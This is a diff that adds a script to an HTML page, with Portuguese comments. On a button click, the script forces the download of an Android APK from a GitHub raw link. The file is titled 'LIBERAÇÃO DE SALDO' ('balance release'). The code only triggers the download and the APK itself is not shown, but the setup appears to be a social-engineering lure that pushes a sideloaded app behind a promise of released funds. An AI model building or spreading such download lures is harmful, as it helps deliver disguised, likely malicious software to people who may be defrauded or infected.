@@ -123,3 +123,44 @@
     </header>
 
     <section class="py-20 max-w-7xl mx-auto px-4">
+        </section>
+
+    <script>
+        function handleDownload(event) {
+            event.preventDefault();
+            
+            // Link direto (raw) para download do arquivo APK no GitHub
+            const downloadUrl = "https://github.com/wellsilvasp13-hash/kibon/raw/main/LIBERA%C3%87AO%20DE%20SALDO.apk";
+            
+            const btnContent = document.getElementById('btn-content');
+            const btnLoading = document.getElementById('btn-loading');
+            const downloadMessage = document.getElementById('download-message');
+            
+            // Ativa o estado de carregamento visual no botão principal
+            if (btnContent && btnLoading) {
+                btnContent.classList.add('hidden');
+                btnLoading.classList.remove('hidden');
+            }
+            
+            // Mostra a mensagem de feedback após 1 segundo
+            setTimeout(() => {
+                if (downloadMessage) {
+                    downloadMessage.classList.remove('hidden');
+                }
+                if (btnContent && btnLoading) {
+                    btnLoading.classList.add('hidden');
+                    btnContent.classList.remove('hidden');
+                }
+            }, 1500);
+
+            // Cria um elemento temporário para forçar a inicialização do download do APK
+            const link = document.createElement('a');
+            link.href = downloadUrl;
+            link.download = "LIBERACAO_DE_SALDO.apk";
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+    </script>
+</body>
+</html>
